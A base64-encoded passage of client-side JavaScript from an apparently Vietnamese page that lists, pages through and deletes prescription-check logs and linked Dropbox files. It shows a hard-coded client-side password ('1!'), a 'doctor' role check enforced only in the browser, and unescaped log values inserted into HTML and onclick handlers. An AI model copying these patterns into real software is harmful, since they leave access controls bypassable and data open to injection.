XYnKTsNCiAgT2JqZWN0LmFzc2lnbihvdmVybGF5LnN0eWxlLCB7DQogICAgcG9zaXRpb246ICdmaXhlZCcsIGluc2V0OiAnMCcsIGJhY2tncm91bmQ6ICdyZ2JhKDAsMCwwLDAuNSknLA0KICAgIGRpc3BsYXk6ICdmbGV4JywganVzdGlmeUNvbnRlbnQ6ICdjZW50ZXInLCBhbGlnbkl0ZW1zOiAnY2VudGVyJywNCiAgICB6SW5kZXg6ICcxMDAwMCcNCiAgfSk7DQoNCiAgLy8gS2h1bmcgcG9wdXANCiAgY29uc3QgYm94ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIE9iamVjdC5hc3NpZ24oYm94LnN0eWxlLCB7DQogICAgYmFja2dyb3VuZDogJyNmZmYnLCBwYWRkaW5nOiAnMjRweCcsIGJvcmRlclJhZGl1czogJzEwcHgnLA0KICAgIG1heFdpZHRoOiAnNDIwcHgnLCB3aWR0aDogJzkwJScsIGJveFNoYWRvdzogJzAgNHB4IDEwcHggcmdiYSgwLDAsMCwwLjMpJywNCiAgICBkaXNwbGF5OiAnZmxleCcsIGZsZXhEaXJlY3Rpb246ICdjb2x1bW4nLCBhbGlnbkl0ZW1zOiAnY2VudGVyJywgZ2FwOiAnMTJweCcNCiAgfSk7DQoNCiAgLy8gVGnDqnUgxJHhu4Egbmfhuq9uIGfhu41uIChraMO0bmcgY8OzIGljb24vZ+G7rWkgZOG7ryBsaeG7h3UpDQogIGNvbnN0IHRpdGxlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIHRpdGxlLnRleHRDb250ZW50ID0gJ05o4bqtcCBt4bqtdCBraOG6qXUgxJHhu4MgbeG7nyBsaW5rJzsNCiAgdGl0bGUuc3R5bGUuZm9udFdlaWdodCA9ICc2MDAnOw0KDQogIC8vIMOUIG5o4bqtcCBt4bqtdCBraOG6qXUNCiAgY29uc3QgaW5wdXQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpOw0KICBPYmplY3QuYXNzaWduKGlucHV0LCB7IHR5cGU6ICdwYXNzd29yZCcsIHBsYWNlaG9sZGVyOiAnTeG6rXQga2jhuql1JyB9KTsNCiAgT2JqZWN0LmFzc2lnbihpbnB1dC5zdHlsZSwgew0KICAgIHBhZGRpbmc6ICcxMHB4Jywgd2lkdGg6ICcxMDAlJywgYm9yZGVyOiAnMXB4IHNvbGlkICNkZGQnLCBib3JkZXJSYWRpdXM6ICc2cHgnDQogIH0pOw0KDQogIC8vIFRow7RuZyBiw6FvIGzhu5dpICjhuqluIG3hurdjIMSR4buLbmgpDQogIGNvbnN0IGVyciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBlcnIudGV4dENvbnRlbnQgPSAn4p2MIFNhaSBt4bqtdCBraOG6qXUhJzsNCiAgT2JqZWN0LmFzc2lnbihlcnIuc3R5bGUsIHsgY29sb3I6ICdyZWQnLCBmb250U2l6ZTogJzE0cHgnLCBkaXNwbGF5OiAnbm9uZScgfSk7DQoNCiAgLy8gTsO6dCB4w6FjIG5o4bqtbg0KICBjb25zdCBidG4gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdidXR0b24nKTsNCiAgYnRuLnRleHRDb250ZW50ID0gJ1jDoWMgbmjhuq1uJzsNCiAgT2JqZWN0LmFzc2lnbihidG4uc3R5bGUsIHsNCiAgICBwYWRkaW5nOiAnMTBweCAxNnB4JywgYmFja2dyb3VuZDogJyMzNDk4ZGInLCBjb2xvcjogJyNmZmYnLA0KICAgIGJvcmRlcjogJ25vbmUnLCBib3JkZXJSYWRpdXM6ICc2cHgnLCBjdXJzb3I6ICdwb2ludGVyJw0KICB9KTsNCg0KICAvLyBQcm9ncmVzcyBiYXIgKMSR4bq3dCBExq/hu5pJIEPDmU5HKQ0KICBjb25zdCBiYXJXcmFwID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIE9iamVjdC5hc3NpZ24oYmFyV3JhcC5zdHlsZSwgew0KICAgIHdpZHRoOiAnMTAwJScsIGJhY2tncm91bmQ6ICcjZGRkJywgaGVpZ2h0OiAnNnB4JywNCiAgICBib3JkZXJSYWRpdXM6ICczcHgnLCBtYXJnaW5Ub3A6ICcxMnB4Jw0KICB9KTsNCiAgY29uc3QgYmFyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIE9iamVjdC5hc3NpZ24oYmFyLnN0eWxlLCB7IHdpZHRoOiAnMCUnLCBoZWlnaHQ6ICcxMDAlJywgYmFja2dyb3VuZDogJyMzNDk4ZGInIH0pOw0KICBiYXJXcmFwLmFwcGVuZENoaWxkKGJhcik7DQoNCiAgLy8gR+G6r24gdsOgbyBET00NCiAgYm94LmFwcGVuZENoaWxkKHRpdGxlKTsNCiAgYm94LmFwcGVuZENoaWxkKGlucHV0KTsNCiAgYm94LmFwcGVuZENoaWxkKGVycik7DQogIGJveC5hcHBlbmRDaGlsZChidG4pOw0KICBib3guYXBwZW5kQ2hpbGQoYmFyV3JhcCk7DQogIG92ZXJsYXkuYXBwZW5kQ2hpbGQoYm94KTsNCiAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChvdmVybGF5KTsNCg0KICAvLyBDaOG6t24gY2xpY2sgYsOqbiB0cm9uZyBraMO0bmcgxJHDs25nDQogIGJveC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGUgPT4gZS5zdG9wUHJvcGFnYXRpb24oKSk7DQogIC8vIENsaWNrIHJhIG5nb8OgaSDEkeG7gyB04bqvdA0KICBvdmVybGF5LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgIGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQob3ZlcmxheSk7DQogIH0pOw0KDQogIC8vIFjhu60gbMO9IHjDoWMgbmjhuq1uDQogIGFzeW5jIGZ1bmN0aW9uIHN1Ym1pdCgpIHsNCiAgICAvLyDEkOG7lWkgbeG6rXQga2jhuql1IOG7nyDEkcOieQ0KICAgIGNvbnN0IE9LID0gaW5wdXQudmFsdWUgPT09ICcxISc7DQoNCiAgICBpZiAoIU9LKSB7DQogICAgICBlcnIuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICByZXR1cm47DQogICAgfQ0KICAgIGVyci5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIGJ0bi5kaXNhYmxlZCA9IHRydWU7DQogICAgaW5wdXQuZGlzYWJsZWQgPSB0cnVlOw0KDQogICAgLy8gQW5pbWF0ZSBwcm9ncmVzcyBuaGFuaCBsw6puIDEwMCUNCiAgICBiYXIuc3R5bGUudHJhbnNpdGlvbiA9ICd3aWR0aCAwLjZzIGVhc2UnOw0KICAgIHJlcXVlc3RBbmltYXRpb25GcmFtZSgoKSA9PiAoYmFyLnN0eWxlLndpZHRoID0gJzEwMCUnKSk7DQogICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICB3aW5kb3cub3Blbih1cmwsICdfYmxhbmsnKTsNCiAgICAgIGlmIChvdmVybGF5LnBhcmVudE5vZGUpIGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQob3ZlcmxheSk7DQogICAgfSwgNjUwKTsNCiAgfQ0KDQogIGJ0bi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIHN1Ym1pdCk7DQogIGlucHV0LmFkZEV2ZW50TGlzdGVuZXIoJ2tleWRvd24nLCAoZSkgPT4gew0KICAgIGlmIChlLmtleSA9PT0gJ0VudGVyJykgc3VibWl0KCk7DQogIH0pOw0KDQogIC8vIEZvY3VzIG5nYXkgw7QgbeG6rXQga2jhuql1DQogIHNldFRpbWVvdXQoKCkgPT4gaW5wdXQuZm9jdXMoKSwgMCk7DQp9DQoNCmZ1bmN0aW9uIGV4dHJhY3RGaWxlbmFtZShkcm9wYm94UHJldmlld1VybCkgew0KICB0cnkgew0KICAgIGNvbnN0IHUgPSBuZXcgVVJMKGRyb3Bib3hQcmV2aWV3VXJsKTsNCiAgICBjb25zdCBwID0gdS5zZWFyY2hQYXJhbXMuZ2V0KCdwcmV2aWV3Jyk7DQogICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChwIHx8ICcnKTsNCiAgfSBjYXRjaCB7IHJldHVybiAnJzsgfQ0KfQ0KDQovLyBI4buZcCB4w6FjIG5o4bqtbiB4b8OhICh0cuG6oyB24buBIFByb21pc2U8Ym9vbGVhbj4pDQpmdW5jdGlvbiBjb25maXJtRGVsZXRlUG9wdXAodGV4dD0nQuG6oW4gY8OzIGNo4bqvYyBtdeG7kW4geG/DoT8nLCBvbmVCdXR0b249ZmFsc2UpIHsNCiAgcmV0dXJuIG5ldyBQcm9taXNlKHJlc29sdmUgPT4gew0KICAgIGNvbnN0IG92ZXJsYXkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICBPYmplY3QuYXNzaWduKG92ZXJsYXkuc3R5bGUsIHsNCiAgICAgIHBvc2l0aW9uOidmaXhlZCcsIGluc2V0OicwJywgYmFja2dyb3VuZDoncmdiYSgwLDAsMCwwLjUpJywNCiAgICAgIGRpc3BsYXk6J2ZsZXgnLCBhbGlnbkl0ZW1zOidjZW50ZXInLCBqdXN0aWZ5Q29udGVudDonY2VudGVyJywgekluZGV4OjEwMDAxDQogICAgfSk7DQoNCiAgICBjb25zdCBib3ggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICBPYmplY3QuYXNzaWduKGJveC5zdHlsZSwgew0KICAgICAgYmFja2dyb3VuZDonI2ZmZicsIHBhZGRpbmc6JzIwcHgnLCBib3JkZXJSYWRpdXM6JzhweCcsDQogICAgICBtYXhXaWR0aDonNDIwcHgnLCB3aWR0aDonOTAlJywgYm94U2hhZG93OicwIDRweCAxMnB4IHJnYmEoMCwwLDAsLjI1KScsDQogICAgICBmb250RmFtaWx5OidJbnRlciwgc2Fucy1zZXJpZicNCiAgICB9KTsNCg0KICAgIGJveC5pbm5lckhUTUwgPSBgDQogICAgICA8ZGl2IHN0eWxlPSJmb250LXdlaWdodDo2MDA7IG1hcmdpbi1ib3R0b206OHB4Ij5Yw6FjIG5o4bqtbiB4b8OhPC9kaXY+DQogICAgICA8ZGl2IHN0eWxlPSJtYXJnaW4tYm90dG9tOjE0cHgiPiR7dGV4dH08L2Rpdj4NCiAgICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDsgZ2FwOjEwcHg7IGp1c3RpZnktY29udGVudDpmbGV4LWVuZCI+DQogICAgICAgIDxidXR0b24gaWQ9ImRsZ0NhbmNlbCIgY2xhc3M9ImJ0biIgc3R5bGU9ImJhY2tncm91bmQ6IzdmOGM4ZCI+SHXhu7c8L2J1dHRvbj4NCiAgICAgICAgJHshb25lQnV0dG9uID8gYDxidXR0b24gaWQ9ImRsZ1llcyIgY2xhc3M9ImJ0biIgc3R5bGU9ImJhY2tncm91bmQ6I2U3NGMzYyI+WG/DoTwvYnV0dG9uPmAgOiAnJ30NCiAgICAgIDwvZGl2Pg0KICAgIGA7DQoNCiAgICBvdmVybGF5LmFwcGVuZENoaWxkKGJveCk7DQogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChvdmVybGF5KTsNCg0KICAgIGJveC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGUgPT4gZS5zdG9wUHJvcGFnYXRpb24oKSk7DQogICAgb3ZlcmxheS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChvdmVybGF5KTsgcmVzb2x2ZShmYWxzZSk7IH0pOw0KICAgIGJveC5xdWVyeVNlbGVjdG9yKCcjZGxnQ2FuY2VsJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7IGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQob3ZlcmxheSk7IHJlc29sdmUoZmFsc2UpOyB9KTsNCg0KICAgIGlmICghb25lQnV0dG9uKSB7DQogICAgICBib3gucXVlcnlTZWxlY3RvcignI2RsZ1llcycpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4geyBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOyByZXNvbHZlKHRydWUpOyB9KTsNCiAgICB9DQogIH0pOw0KfQ0KDQovLyBYb8OhIDEgZW50cnkgbG9nICsgZmlsZSBFeGNlbCB0csOqbiBEcm9wYm94ICh0aGVvIGluZGV4IHRyb25nIG3huqNuZyBsb2dzKQ0KYXN5bmMgZnVuY3Rpb24gZGVsZXRlTG9nQW5kRmlsZV9CeUluZGV4KGlkeCkgew0KICBjb25zdCBhY2Nlc3NUb2tlbiA9IGF3YWl0IGdldEFjY2Vzc1Rva2VuKCk7DQogIGNvbnN0IGRieCA9IG5ldyBEcm9wYm94LkRyb3Bib3goeyBhY2Nlc3NUb2tlbiB9KTsNCiAgY29uc3QgbG9nUGF0aCA9ICcvdGh1dGh1YXQvbG9nLmpzb24nOw0KDQogIC8vIDEpIFThuqNpIGxvZy5qc29uIGhp4buHbiB04bqhaQ0KICBsZXQgbG9ncyA9IFtdOw0KICB0cnkgew0KICAgIGNvbnN0IGRsID0gYXdhaXQgZGJ4LmZpbGVzRG93bmxvYWQoeyBwYXRoOiBsb2dQYXRoIH0pOw0KICAgIGNvbnN0IHRleHQgPSBhd2FpdCBkbC5yZXN1bHQuZmlsZUJsb2IudGV4dCgpOw0KICAgIGxvZ3MgPSBKU09OLnBhcnNlKHRleHQgfHwgJ1tdJyk7DQogIH0gY2F0Y2ggKGUpIHsNCiAgICBhbGVydCgnS2jDtG5nIMSR4buNYyDEkcaw4bujYyBsb2cuanNvbiB0csOqbiBEcm9wYm94LicpOyANCiAgICB0aHJvdyBlOw0KICB9DQoNCiAgY29uc3QgaXRlbSA9IGxvZ3NbaWR4XTsNCiAgaWYgKCFpdGVtKSB7IGFsZXJ0KCdLaMO0bmcgdMOsbSB0aOG6pXkgbeG7pWMgY+G6p24geG/DoS4nKTsgcmV0dXJuOyB9DQoNCiAgLy8gMikgTOG6pXkgZmlsZU5hbWUgJiB4b8OhIGZpbGUgRXhjZWwgKG7hur91IGPDsykNCiAgY29uc3QgZmlsZU5hbWUgPSBleHRyYWN0RmlsZW5hbWUoaXRlbS5saW5rIHx8ICcnKTsNCiAgY29uc3QgZmlsZVBhdGggPSBmaWxlTmFtZSA/IGAvdGh1dGh1YXQvJHtmaWxlTmFtZX1gIDogbnVsbDsNCg0KICB0cnkgew0KICAgIGlmIChmaWxlUGF0aCkgeyBhd2FpdCBkYnguZmlsZXNEZWxldGVWMih7IHBhdGg6IGZpbGVQYXRoIH0pOyB9DQogIH0gY2F0Y2ggKGUpIHsNCiAgICAvLyBO4bq/dSBmaWxlIGtow7RuZyB04buTbiB04bqhaSB24bqrbiB0aeG6v3AgdOG7pWMgeG/DoSBsb2cNCiAgICBjb25zb2xlLndhcm4oJ1hvw6EgZmlsZSBFeGNlbCBs4buXaS9raMO0bmcgdOG7k24gdOG6oWksIHRp4bq/cCB04bulYyB4b8OhIGxvZy4uLicsIGUpOw0KICB9DQoNCiAgLy8gMykgQ+G6rXAgbmjhuq10IGxvZzogYuG7jyBwaOG6p24gdOG7rSBpZHggdsOgIGdoaSDEkcOoIGzhuqFpDQogIGxvZ3Muc3BsaWNlKGlkeCwgMSk7DQogIGF3YWl0IGRieC5maWxlc1VwbG9hZCh7DQogICAgcGF0aDogbG9nUGF0aCwNCiAgICBjb250ZW50czogSlNPTi5zdHJpbmdpZnkobG9ncywgbnVsbCwgMiksDQogICAgbW9kZTogeyAnLnRhZyc6ICdvdmVyd3JpdGUnIH0sDQogICAgYXV0b3JlbmFtZTogZmFsc2UNCiAgfSk7DQp9DQoNCg0KYXN5bmMgZnVuY3Rpb24gb25EZWxldGVMb2dSb3coaW5kZXhJbkxvZ3MsIGN1cnJlbnRVc2VyKSB7DQogIC8vIE7hur91IGtow7RuZyBwaOG6o2kgZG9jdG9yIOKGkiBwb3B1cCBj4bqlbSB4b8OhLCBjaOG7iSBjw7MgMSBuw7p0IEh14bu3DQogIGlmIChjdXJyZW50VXNlciAhPT0gJ2RvY3RvcicpIHsNCiAgICBhd2FpdCBjb25maXJtRGVsZXRlUG9wdXAoDQogICAgICAn4p2MIMOKIGzDoG0gY8OhaSBnw6wgxJHhuqV5eXl5IGVtIMahaS4gPGJyLz5E4burbmcgbOG6oWkgbmdheSwgcXXDoSBuZ3V5IGhp4buDbS4nLA0KICAgICAgdHJ1ZSAvLyA8LS0gY2jhur8gxJHhu5kgMSBuw7p0DQogICAgKTsNCiAgICByZXR1cm47DQogIH0NCg0KICAvLyBO4bq/dSBsw6AgZG9jdG9yIOKGkiBwb3B1cCB4w6FjIG5o4bqtbiB4b8OhICgyIG7DunQpDQogIGNvbnN0IG9rID0gYXdhaXQgY29uZmlybURlbGV0ZVBvcHVwKA0KICAgICdC4bqhbiBjw7MgY2jhuq9jIG114buRbiB4b8OhIG3hu6VjIG7DoHk/JywNCiAgICBmYWxzZQ0KICApOw0KICBpZiAoIW9rKSByZXR1cm47DQoNCiAgdHJ5IHsNCiAgICBhd2FpdCBkZWxldGVMb2dBbmRGaWxlX0J5SW5kZXgoaW5kZXhJbkxvZ3MpOw0KICAgIGF3YWl0IGNvbmZpcm1EZWxldGVQb3B1cCgn4pyFIMSQw6MgeG/DoSB0aMOgbmggY8O0bmchJywgdHJ1ZSk7DQogICAgYXdhaXQgc2hvd0Ryb3Bib3hQYW5lbCgpOw0KICB9IGNhdGNoIChlKSB7DQogICAgY29uc29sZS5lcnJvcihlKTsNCiAgICBhd2FpdCBjb25maXJtRGVsZXRlUG9wdXAoJ+KaoO+4jyBDw7MgbOG7l2kga2hpIHhvw6EuIFZ1aSBsw7JuZyB0aOG7rSBs4bqhaS4nLCB0cnVlKTsNCiAgfQ0KfQ0KDQovLyDEkMOzbmcgcGFuZWwga2hpIGLhuqVtIEVTQyBob+G6t2MgY2xpY2sgcmEgbmdvw6BpDQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIiwgZnVuY3Rpb24oZSkgew0KICBpZiAoZS5rZXkgPT09ICJFc2NhcGUiKSB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRyb3Bib3hQYW5lbCIpLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogIH0NCn0pOw0KDQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKGUpIHsNCiAgY29uc3QgcGFuZWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZHJvcGJveFBhbmVsIik7DQogIGlmIChwYW5lbC5zdHlsZS5kaXNwbGF5ID09PSAiYmxvY2siIHx8IHBhbmVsLnN0eWxlLmRpc3BsYXkgPT09ICJmbGV4Iikgew0KICAgIGNvbnN0IGNvbnRlbnQgPSBwYW5lbC5xdWVyeVNlbGVjdG9yKCJkaXYiKTsNCiAgICAvLyBO4bq/dSBjbGljayBuZ2/DoGkgdsO5bmcgbuG7mWkgZHVuZyBwYW5lbA0KICAgIGlmICghY29udGVudC5jb250YWlucyhlLnRhcmdldCkpIHsNCiAgICAgIHBhbmVsLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgfQ0KICB9DQp9KTsNCg0KPC9zY3JpcHQ+DQo8c2NyaXB0Pg0KLy8gPT09PT09IFBIw4JOIFRSQU5HIELhuqJORyBMT0cgVFJPTkcgUE9QVVAgPT09PT09DQpsZXQgREJfTE9HUyA9IFtdOyAgICAgICAvLyB0b8OgbiBi4buZIGxvZ3MgxJHDoyB04bqjaQ0KbGV0IERCX1BBR0UgPSAxOyAgICAgICAgLy8gdHJhbmcgaGnhu4duIHThuqFpDQpsZXQgREJfUEFHRV9TSVpFID0gMTA7ICAvLyBz4buRIGTDsm5nIC8gdHJhbmcNCmxldCBEQl9DVVJSRU5UX1VTRVIgPSAnJzsgLy8gdXNlciDEkWFuZyDEkcSDbmcgbmjhuq1wIChsb3dlcmNhc2UpIMSR4buDIHJlbmRlciBuw7p0IFhvw6ENCg0KZnVuY3Rpb24gc2V0UGFnZVNpemUoc2l6ZSl7DQogIERCX1BBR0VfU0laRSA9IE51bWJlcihzaXplKSB8fCAxMDsNCiAgREJfUEFHRSA9IDE7DQogIHJlbmRlckRyb3Bib3hQYWdlKCk7DQp9DQoNCmZ1bmN0aW9uIGdvVG9QYWdlKHApew0KICBjb25zdCBtYXggPSBNYXRoLm1heCgxLCBNYXRoLmNlaWwoREJfTE9HUy5sZW5ndGggLyBEQl9QQUdFX1NJWkUpKTsNCiAgREJfUEFHRSA9IE1hdGgubWluKE1hdGgubWF4KDEsIHApLCBtYXgpOw0KICByZW5kZXJEcm9wYm94UGFnZSgpOw0KfQ0KDQpmdW5jdGlvbiByZW5kZXJEcm9wYm94UGFnZSgpew0KICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94RmlsZUxpc3QnKTsNCiAgY29uc3QgcGFnZUJ0bnMgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhZ2VCdXR0b25zJyk7DQogIGNvbnN0IHBhZ2VJbmZvID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYWdlSW5mbycpOw0KDQogIGlmKCF0Ym9keSkgcmV0dXJuOw0KDQogIC8vIHLhu5duZz8NCiAgaWYoIUFycmF5LmlzQXJyYXkoREJfTE9HUykgfHwgREJfTE9HUy5sZW5ndGggPT09IDApew0KICAgIHRib2R5LmlubmVySFRNTCA9IGA8dHI+PHRkIGNvbHNwYW49IjYiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjtjb2xvcjpyZWQiPktow7RuZyBjw7MgZGFuaCBzw6FjaCBuw6BvIMSRxrDhu6NjIGzGsHU8L3RkPjwvdHI+YDsNCiAgICBpZihwYWdlQnRucykgcGFnZUJ0bnMuaW5uZXJIVE1MID0gJyc7DQogICAgaWYocGFnZUluZm8pIHBhZ2VJbmZvLnRleHRDb250ZW50ID0gJyc7DQogICAgcmV0dXJuOw0KICB9DQoNCiAgY29uc3QgdG90YWwgPSBEQl9MT0dTLmxlbmd0aDsNCiAgY29uc3QgbWF4UGFnZSA9IE1hdGgubWF4KDEsIE1hdGguY2VpbCh0b3RhbCAvIERCX1BBR0VfU0laRSkpOw0KICBpZihEQl9QQUdFID4gbWF4UGFnZSkgREJfUEFHRSA9IG1heFBhZ2U7DQoNCiAgY29uc3Qgc3RhcnRJZHggPSAoREJfUEFHRSAtIDEpICogREJfUEFHRV9TSVpFOw0KICBjb25zdCBlbmRJZHggICA9IE1hdGgubWluKHN0YXJ0SWR4ICsgREJfUEFHRV9TSVpFLCB0b3RhbCk7DQogIGNvbnN0IHNsaWNlICAgID0gREJfTE9HUy5zbGljZShzdGFydElkeCwgZW5kSWR4KTsNCg0KICAvLyBSZW5kZXIgYm9keSB0aGVvIHRyYW5nDQogIHRib2R5LmlubmVySFRNTCA9IHNsaWNlLm1hcCgoaXRlbSwgaSkgPT4gYA0KICAgIDx0cj4NCiAgICAgIDx0ZD4ke3N0YXJ0SWR4ICsgaSArIDF9PC90ZD4NCiAgICAgIDx0ZD4ke2l0ZW0ua2hvYSB8fCAnJ308L3RkPg0KICAgICAgPHRkPiR7KGl0ZW0ubmdheSB8fCAnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJzAwOjAwOjAwJywnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJzIzOjU5OjU5JywnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJ1Thu6snLCcnKQ0KICAgICAgICAgICAucmVwbGFjZSgnxJHhur9uJywnIC0+ICcpDQogICAgICAgICAgIC5yZXBsYWNlKC9ccysvZywnICcpDQogICAgICAgICAgIC50cmltKCl9PC90ZD4NCgkJICAgDQoJCSAgIDx0ZD4ke051bWJlcihpdGVtLmhlcmJfZXJyb3JzIHx8IDApfTwvdGQ+DQogICAgIDx0ZD4ke051bWJlcihpdGVtLnRpbWVfZXJyb3JzIHx8IDApfTwvdGQ+DQogICAgPHRkPiR7TnVtYmVyKGl0ZW0uY29uZmxpY3RfZXJyb3JzIHx8IDApfTwvdGQ+DQoJCSAgIA0KICAgICAgPHRkPiR7KGl0ZW0udGltZSB8fCAnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJywnLCAnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJyAnLCAnIC0gJykNCiAgICAgICAgICAgLnJlcGxhY2UoL1xzKy9nLCAnICcpDQogICAgICAgICAgIC50cmltKCl9PC90ZD4NCiAgICAgIDx0ZD48YSBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiIG9uY2xpY2s9InZlcmlmeUFuZE9wZW5MaW5rKCcke2l0ZW0ubGlua30nKSI+WGVtPC9hPjwvdGQ+DQogICAgICA8dGQ+DQogICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgc3R5bGU9ImJhY2tncm91bmQ6I2U3NGMzYzsgcGFkZGluZzoxMHB4IDE0cHg7IGZvbnQtc2l6ZToxMnB4OyINCiAgICAgICAgICBvbmNsaWNrPSJvbkRlbGV0ZUxvZ1Jvdygke3N0YXJ0SWR4ICsgaX0sICcke0RCX0NVUlJFTlRfVVNFUn0nKSI+DQogICAgICAgICAgPGkgY2xhc3M9ImZhIGZhLXRyYXNoIj48L2k+IFhvw6ENCiAgICAgICAgPC9idXR0b24+DQogICAgICA8L3RkPg0KICAgIDwvdHI+DQogIGApLmpvaW4oJycpOw0KDQogIC8vIFJlbmRlciBuw7p0IHRyYW5nIChQcmV2IOKApiBOZXh0KSDigJQgaGnhu4NuIHRo4buLIGThuqNpIHThu5FpIMSRYSA3IG7DunQgc+G7kQ0KICBpZihwYWdlQnRucyl7DQogICAgY29uc3QgYnRuID0gKGxhYmVsLCB0YXJnZXQsIGRpc2FibGVkPWZhbHNlLCB0aXRsZT0nJykgPT4NCiAgICAgIGA8YnV0dG9uIGNsYXNzPSJidG4iICR7ZGlzYWJsZWQ/J2Rpc2FibGVkJzonJ30gdGl0bGU9IiR7dGl0bGV9Ig0KICAgICAgICAgICAgICAgc3R5bGU9InBhZGRpbmc6NnB4IDEwcHgke2Rpc2FibGVkPyc7b3BhY2l0eTouNjtjdXJzb3I6bm90LWFsbG93ZWQnOicnfSINCiAgICAgICAgICAgICAgIG9uY2xpY2s9ImdvVG9QYWdlKCR7dGFyZ2V0fSkiPiR7bGFiZWx9PC9idXR0b24+YDsNCg0KICAgIGNvbnN0IHJhbmdlID0gMzsgLy8gaGFpIGLDqm4gdHJhbmcgaGnhu4duIHThuqFpDQogICAgY29uc3QgZnJvbSAgPSBNYXRoLm1heCgxLCBEQl9QQUdFIC0gcmFuZ2UpOw0KICAgIGNvbnN0IHRvICAgID0gTWF0aC5taW4obWF4UGFnZSwgREJfUEFHRSArIHJhbmdlKTsNCg0KICAgIGxldCBodG1sID0gJyc7DQogICAgaHRtbCArPSBidG4oJ8KrIMSQ4bqndScsIDEsIERCX1BBR0U9PT0xLCAnVHJhbmcgxJHhuqd1Jyk7DQogICAgaHRtbCArPSBidG4oJ+KAuSBUcsaw4bubYycsIERCX1BBR0UtMSwgREJfUEFHRT09PTEsICdUcmFuZyB0csaw4bubYycpOw0KICAgIGZvcihsZXQgcCA9IGZyb207IHAgPD0gdG87IHArKyl7DQogICAgICBodG1sICs9IGA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImdvVG9QYWdlKCR7cH0pIg0KICAgICAgICAgICAgICAgICBzdHlsZT0icGFkZGluZzo2cHggMTBweDske3A9PT1EQl9QQUdFPydiYWNrZ3JvdW5kOiMyZWNjNzEnOicnfSI+DQogICAgICAgICAgICAgICAgICR7cH0NCiAgICAgICAgICAgICAgIDwvYnV0dG9uPmA7DQogICAgfQ0KICAgIGh0bWwgKz0gYnRuKCdTYXUg4oC6JywgREJfUEFHRSsxLCBEQl9QQUdFPT09bWF4UGFnZSwgJ1RyYW5nIHNhdScpOw0KICAgIGh0bWwgKz0gYnRuKCdDdeG7kWkgwrsnLCBtYXhQYWdlLCBEQl9QQUdFPT09bWF4UGFnZSwgJ1RyYW5nIGN14buRaScpOw0KDQogICAgcGFnZUJ0bnMuaW5uZXJIVE1MID0gaHRtbDsNCiAgfQ0KDQogIGlmKHBhZ2VJbmZvKXsNCiAgICBwYWdlSW5mby50ZXh0Q29udGVudCA9IGBUcmFuZyAke0RCX1BBR0V9LyR7bWF4UGFnZX0g4oCiICR7c3RhcnRJZHgrMX0tJHtlbmRJZHh9LyR7dG90YWx9YDsNCiAgfQ0KfQ0KDQovLyBH4bqvbiBz4buxIGtp4buHbiDEkeG7lWkgcGFnZSBzaXplIChjaOG7iSBj4bqnbiBn4buNaSAxIGzhuqduIHNhdSBraGkgcG9wdXAgbeG7nykNCmZ1bmN0aW9uIGF0dGFjaFBhZ2VyRXZlbnRzT25jZSgpew0KICBjb25zdCBzZWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhZ2VTaXplJyk7DQogIGlmKHNlbCAmJiAhc2VsLmRhdGFzZXQuYm91bmQpew0KICAgIHNlbC5kYXRhc2V0LmJvdW5kID0gJzEnOw0KICAgIHNlbC5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBlID0+IHNldFBhZ2